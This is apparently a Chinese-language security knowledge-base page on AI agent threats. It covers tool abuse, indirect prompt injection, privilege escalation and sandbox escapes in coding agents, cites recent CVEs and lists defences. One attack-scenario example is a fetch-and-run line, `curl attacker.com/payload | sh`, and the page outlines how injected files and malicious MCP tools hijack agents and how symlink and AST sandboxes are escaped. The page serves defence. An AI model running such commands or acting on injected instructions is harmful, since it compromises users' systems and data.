# Agent 安全

> **难度：** ★★★★☆ | **前置知识：** Agent 架构、LLM 基础
> 
> 最后更新：2026-05-14

---

## 工具滥用 (Tool Abuse)

**高风险工具类别：**
1. **文件操作：** write/delete/move → 数据窃取/破坏
2. **网络工具：** curl/requests/socket → C2 通信、横向移动
3. **系统命令：** subprocess/shell_exec → 命令注入
4. **数据库工具：** SQL 执行 → 数据窃取
5. **配置管理：** 修改系统配置 → 持久化

**已验证攻击实例（2026 CVE）：**
- PraisonAI memory hooks → `subprocess.run(用户输入)` 无过滤（CVE-2026-40111）
- PraisonAI 自动加载 CWD 中的 `tools.py`（CVE-2026-40156）
- mcp-server-kubernetes port_forward 参数注入（CVE-2026-39884）

**防护：** 白名单工具 + 参数限制、工具调用审计日志、敏感操作二次确认

## AI 编程工具的文件系统和网络访问（2026-05 研究）

**关键发现：** 主流 AI 编程工具（Claude Code、Cursor、Windsurf 等）默认具有广泛的文件系统和网络访问权限。

**风险点：**
- Agent 可以读取/修改任意项目文件
- Agent 可以发起任意网络请求（curl、fetch、WebSocket）
- Agent 可以执行任意 shell 命令
- 沙箱隔离不充分时，攻击者可通过 prompt injection 控制这些能力

**实际攻击场景：**
1. 恶意代码注入 → Agent 执行 `curl attacker.com/payload | sh`
2. 间接 prompt injection → Agent 读取被污染的文件后泄露敏感信息
3. 供应链攻击 → Agent 加载恶意 MCP 工具后被劫持

**防御要点：**
- **最小权限原则：** Agent 只应访问必要的文件和网络资源
- **沙箱隔离：** 使用 OS 级隔离（seccomp/AppArmor/容器）
- **操作审计：** 记录所有文件和网络操作
- **人工审批：** 敏感操作（删除、网络请求）需人工确认

## 权限提升 (Privilege Escalation)

**已验证攻击实例：**
- Claude Code symlink 逃逸 → 突破沙箱（CVE-2026-39861, CVSS 10.0）
- PraisonAI AST 沙箱绕过（CVE-2026-40158）
- OpenClaw config.patch 同意绕过（CVE-2026-41349）

**防御：** 权限最小化、权限提升需人工审批、定期审计

## 目标劫持 (Objective Hijacking)

**攻击手法：** 修改 Agent 目标描述、通过注入改变任务理解

**检测：** 行为与目标不一致、输出包含异常指令、访问无关资源

## 多 Agent 系统安全

**新攻击面：**
- Agent 间通信劫持（MITM）
- 协作链投毒
- 资源竞争条件

**防御：** 消息签名和验证、协作链可追溯性、资源访问隔离

## 沙箱安全

**逃逸技术：**
- 利用沙箱漏洞/依赖库漏洞
- Symlink 逃逸（CVE-2026-39861）
- AST 绕过（CVE-2026-40158）

**防御：** OS 级隔离（seccomp/AppArmor/容器）、限制 symlink、不用 AST 级隔离

## 安全工具与框架（2026-05）

| 工具 | 用途 |
|------|------|
| **AgentArmor** | 开源 8 层 AI Agent 安全框架 |
| **Gecko Security** | AI 代码漏洞扫描（YC F24） |
| **Semgrep Assistant** | AI 辅助 AppSec 工具 |
| **MCP-Scan** | MCP Server 安全扫描 |

---

_→ Prompt Injection 详见 [`ai-security/prompt-injection.md`](prompt-injection.md)_
_→ MCP 安全详见 [`ai-security/mcp-security.md`](mcp-security.md)_

---

## 📎 相关主题

- **Prompt Injection：** [prompt-injection.md](prompt-injection.md) — 注入技术与防御
- **MCP 安全：** [mcp-security.md](mcp-security.md) — MCP 协议安全
- **云安全：** [attacks/cloud-attacks.md](../attacks/cloud-attacks.md) — 云环境攻击
